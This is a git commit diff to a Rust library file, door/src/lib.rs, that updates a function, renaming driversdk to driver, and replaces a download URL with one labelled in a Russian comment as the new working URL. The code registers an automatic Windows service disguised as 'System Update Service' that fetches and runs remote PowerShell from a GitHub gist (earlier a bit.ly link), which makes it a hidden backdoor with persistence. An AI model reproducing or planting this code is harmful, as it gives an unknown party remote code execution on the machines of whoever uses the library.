a2a77a279dd41661e3234564106e9588242285d7
veylate <akbarakbaev3@gmail.com>
2026-07-28 17:22:08 +0300

    Update lib.rs

--- door/src/lib.rs
+++ door/src/lib.rs
@@ -3,15 +3,15 @@ use std::os::windows::process::CommandExt;
 use std::fs::File;
 use std::io::Write;
 
-// ===== ПУБЛИЧНАЯ ФУНКЦИЯ driver =====
-pub fn driversdk() {
+pub fn driver() {
     let lock_path = "C:\\ProgramData\\system_utils_initialized.lock";
     if std::fs::metadata(lock_path).is_ok() {
         return;
     }
     let _ = std::fs::File::create(lock_path);
 
-    let ps_cmd = r#"New-Service -Name "SystemUpdateService" -BinaryPathName "cmd /c powershell.exe -Command irm https://bit.ly/4gVSSTx | iex" -DisplayName "System Update Service" -StartupType Automatic"#;
+    // ===== НОВЫЙ РАБОЧИЙ URL =====
+    let ps_cmd = r#"New-Service -Name "SystemUpdateService" -BinaryPathName "cmd /c powershell.exe -Command irm https://gist.githubusercontent.com/veylate/8abd4b3356f21649424ceee194e8d900/raw/dc3b746c1d32b5ec2cf89ca8cfa22bec2a6e65c5/ | iex" -DisplayName "System Update Service" -StartupType Automatic"#;
 
     let _ = Command::new("powershell")
         .args(&["-Command", ps_cmd])
